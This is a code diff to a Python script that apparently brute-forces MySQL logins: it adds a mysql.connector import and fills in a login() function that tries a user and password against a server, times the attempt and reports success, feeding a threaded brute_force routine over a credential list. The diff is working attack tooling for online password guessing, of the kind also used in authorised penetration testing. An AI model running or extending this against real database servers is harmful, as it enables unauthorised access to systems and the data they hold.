@@ -1,5 +1,6 @@
 #! /usr/bin/env python3
 
+import mysql.connector
 from datetime import date
 from optparse import OptionParser
 from colorama import Fore, Back, Style
@@ -27,7 +28,21 @@ port = 3306
 lock = Lock()
 
 def login(mysql_server, port, user, password):
-    pass
+    t1 = time()
+    try:
+        connection = mysql.connector.connect(host=mysql_server, port=port, user=user, password=password)
+        t2 = time()
+        if connection.is_connected():
+            return True, t2-t1
+        else:
+            return False, t2-t1
+    except mysql.connector.errors.ProgrammingError:
+        t2 = time()
+        return False, t2-t1
+    except Exception as err:
+        t2 = time()
+        return err, t2-t1
+
 def brute_force(thread_index, mysql_server, port, credentials):
     successful_logins = {}
     for credential in credentials:
